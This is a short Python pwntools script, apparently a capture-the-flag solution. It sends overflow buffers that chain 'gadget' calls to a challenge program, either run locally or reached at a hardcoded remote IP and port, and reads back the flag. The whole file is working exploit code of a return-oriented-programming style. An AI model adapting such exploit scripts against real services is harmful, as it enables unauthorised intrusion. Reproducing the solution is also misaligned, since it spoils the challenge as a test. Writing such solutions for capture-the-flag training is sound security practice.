#!/usr/bin/python

from sys import argv
from pwn import *

def roprop(addr, val=""):
    buf = 'A'*(32)
    buf += addr
    buf += val.ljust(8, ' ')
    buf += 'main'.ljust(8, ' ')
    p.sendline(buf)

def exploit(p):
    roprop('gadget_1', 'flag')
    roprop('gadget_2', 'r')
    roprop('gadget_3', '99999999')
    roprop('get_file')
    flag = p.recvall().split()[-1]
    info(flag)

if __name__ == '__main__':
    if len(argv) < 2:
        p = process(['python3', 'tempat_kembali2.py'])
    else:
        p = remote('128.199.104.41', 29661)
    # go laaa
    exploit(p)